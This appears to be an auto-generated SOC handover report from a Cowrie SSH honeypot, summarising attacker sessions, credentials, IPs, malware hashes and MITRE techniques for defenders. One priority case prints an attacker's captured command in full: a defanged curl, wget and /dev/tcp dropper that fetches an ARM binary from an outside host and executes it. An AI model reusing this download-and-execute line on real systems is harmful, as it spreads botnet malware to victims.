# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-05 |
| **Generated At** | 2026-04-05T12:53:11Z |
| **Shift Time** | 12:53 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **66** |
| Confirmed Threats | **63** |
| False Positives Filtered | **3** (4.5%) |
| Unique Attacker IPs | **12** |
| Countries of Origin | **5** |
| High Severity Cases | **3** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **63** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **9** |
| Unique Credential Pairs | **6** |
| Unique Usernames | **4** |
| Unique Passwords | **6** |
| Successful Auth Pairs | **3** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 3 |
| `GET / HTTP/1.1` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | 2 |
| `Accept-Encoding: gzip` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `Host: 13.235.92.17:23` | 2 |
| `Accept: */*` | 2 |
| `` | 2 |
| `firedancer` | 1 |
| `Aa@123456` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 2 |
| `Accept-Encoding: gzip` | `` | 2 |
| `root` | `firedancer` | 1 |
| `root` | `Aa@123456` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `firedancer` | `128.24.161.194` | 2026-04-05T10:37:42 |
| `root` | `Aa@123456` | `47.107.147.159` | 2026-04-05T10:44:25 |
| `root` | `validator` | `128.24.161.194` | 2026-04-05T10:57:09 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **66** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 2 | 1 |
| `1b8acd46a07d...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 2 | 1 | Generic scanner |
| `1b8acd46a07d...` | Unknown | 1 | 1 | Modern SSH client |

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **12** |
| Unique ASNs | **11** |
| High-Risk ASNs | **5** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | MEDIUM |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | MEDIUM |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 1 | MEDIUM |
| `AS36873` | Airtel Networks Limited | 1 | MEDIUM |
| `AS12271` | Charter Communications Inc | 1 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | LOW |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (3)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-13c37862dfda

| Field | Detail |
|---|---|
| **Source IP** | `128.24.161[.]194` |
| **First Seen** | 2026-04-05 10:37 |
| **Last Seen** | 2026-04-05 10:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 10:37:41` | `cowrie.session.connect` |
| `2026-04-05 10:37:41` | `cowrie.client.version` |
| `2026-04-05 10:37:41` | `cowrie.client.kex` |
| `2026-04-05 10:37:42` | `cowrie.login.success` |
| `2026-04-05 10:37:43` | `cowrie.session.params` |
| `2026-04-05 10:37:43` | `cowrie.command.input` |
| `2026-04-05 10:37:43` | `cowrie.log.closed` |
| `2026-04-05 10:37:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.24.161[.]194` to AbuseIPDB if not already reported
- [ ] Block `128.24.161[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25fe77fe3c6a

| Field | Detail |
|---|---|
| **Source IP** | `47.107.147[.]159` |
| **First Seen** | 2026-04-05 10:44 |
| **Last Seen** | 2026-04-05 10:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 1 > /dev/null && cat /bin/echo, nohup $SHELL -c "curl hxxp://8.210.122[.]125:60149/arm_linux -o /tmp/6OYqUmCfv6; if [ ! -f /tmp/6OYqUmCfv6 ]; then wget hxxp://8.210.122[.]125:60149/arm_linux -O /tmp/6OYqUmCfv6; fi; if [ ! -f /tmp/6OYqUmCfv6 ]; then exec 6<>/dev/tcp/8.210.122[.]125/60149 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/6OYqUmCfv6 ; chmod +x /tmp/6OYqUmCfv6 && /tmp/6OYqUmCfv6 1B8o8cTmG9gcMQDaAO3T/CoPpKUPPP7E5hzeHDEF2ADl3/YmCaWkDi3m3uMA3gYyHN0e7MTxLQWjpQ4s8crsAN4DOBzeHOHE8i4Fo6UOLPfK7ADeAzAc3RnsxPIsBaOlDi/3yuAZwgAzBcIf5tjoLQqgrw, head -c 2612960 > /tmp/W36nKy0sh7, nohup $SHELL -c "curl hxxp://8.210.122[.]125:60149/arm_linux -o /tmp/6OYqUmCfv6; if [ ! -f /tmp/6OYqUmCfv6 ]; then wget hxxp://8.210.122[.]125:60149/arm_linux -O /tmp/6OYqUmCfv6; fi; if [ ! -f /tmp/6OYqUmCfv6 ]; then exec 6<>/dev/tcp/8.210.122[.]125/60149 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/6OYqUmCfv6 ; chmod +x /tmp/6OYqUmCfv6 && /tmp/6OYqUmCfv6 1B8o8cTmG9gcMQDaAO3T/CoPpKUPPP7E5hzeHDEF2ADl3/YmCaWkDi3m3uMA3gYyHN0e7MTxLQWjpQ4s8crsAN4DOBzeHOHE8i4Fo6UOLPfK7ADeAzAc3RnsxPIsBaOlDi/3yuAZwgAzBcIf5tjoLQqgrw, (vLXXXELF` |
| **TTPs (MITRE)** | T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 10:44:24` | `cowrie.session.connect` |
| `2026-04-05 10:44:24` | `cowrie.client.version` |
| `2026-04-05 10:44:24` | `cowrie.client.kex` |
| `2026-04-05 10:44:25` | `cowrie.login.success` |
| `2026-04-05 10:44:25` | `cowrie.session.params` |
| `2026-04-05 10:44:25` | `cowrie.command.input` |
| `2026-04-05 10:44:28` | `cowrie.command.input` |
| `2026-04-05 10:44:28` | `cowrie.command.input` |
| `2026-04-05 10:44:28` | `cowrie.command.input` |
| `2026-04-05 10:44:28` | `cowrie.command.input` |
| `2026-04-05 10:44:28` | `cowrie.command.input` |
| `2026-04-05 10:44:28` | `cowrie.command.input` |
| `2026-04-05 10:44:28` | `cowrie.command.failed` |
| `2026-04-05 10:44:28` | `cowrie.command.failed` |
| `2026-04-05 10:44:28` | `cowrie.log.closed` |
| `2026-04-05 10:44:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.107.147[.]159` to AbuseIPDB if not already reported
- [ ] Block `47.107.147[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd8f80b80057

| Field | Detail |
|---|---|
| **Source IP** | `128.24.161[.]194` |
| **First Seen** | 2026-04-05 10:57 |
| **Last Seen** | 2026-04-05 10:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uptime` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 10:57:08` | `cowrie.session.connect` |
| `2026-04-05 10:57:08` | `cowrie.client.version` |
| `2026-04-05 10:57:08` | `cowrie.client.kex` |
| `2026-04-05 10:57:09` | `cowrie.login.success` |
| `2026-04-05 10:57:09` | `cowrie.session.params` |
| `2026-04-05 10:57:09` | `cowrie.command.input` |
| `2026-04-05 10:57:09` | `cowrie.log.closed` |
| `2026-04-05 10:57:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.24.161[.]194` to AbuseIPDB if not already reported
- [ ] Block `128.24.161[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `175.107.228[.]21` | **25** | 2026-04-05 10:45 | 2026-04-05 10:51 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `223.123.41[.]66` | **25** | 2026-04-05 11:33 | 2026-04-05 11:38 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `18.218.118[.]203` | **6** | 2026-04-05 11:19 | 2026-04-05 11:26 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `105.113.242[.]100` | 1 | 2026-04-05 12:35 | 2026-04-05 12:35 | 14s | 0 | `T1592` | 🟢 LOW |
| `113.239.119[.]157` | 1 | 2026-04-05 10:41 | 2026-04-05 10:42 | 44s | 0 | `T1592` | 🟢 LOW |
| `24.90.204[.]80` | 1 | 2026-04-05 10:55 | 2026-04-05 10:55 | 12s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-04-05 11:04 | 2026-04-05 11:05 | 91s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 10/100 | 🟢 LOW | **26/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `113.239.119[.]157` | CN | China Unicom Liaoning province network | **100** ⚠️ | 1 |
| `24.90.204[.]80` | US | Charter Communications Inc | **100** ⚠️ | 11 |
| `49.88.156[.]34` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `18.218.118[.]203` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `223.123.41[.]66` | PK | CMPak Limited | **100** ⚠️ | 0 |
| `47.107.147[.]159` | CN | Aliyun Computing Co., LTD | **86** ⚠️ | 7 |
| `105.113.242[.]100` | NG | Airtel Networks Limited | **81** ⚠️ | 0 |
| `175.107.228[.]21` | PK | Broadband Services | **81** ⚠️ | 2 |
| `128.24.161[.]194` | US | Microsoft Limited | **67** | 5 |
| `4.236.158[.]51` | US | Microsoft Corporation | **43** | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 3 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 3 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 2 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 1 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 1 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 66 cases |
| Tool 34  | Credential Extractor        | ✅ 9 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 12 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (4.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 11 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 3 priority case(s) shown individually · 7 recon entry/entries in table (3 group(s) consolidating 56 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-05T12:53:11Z_
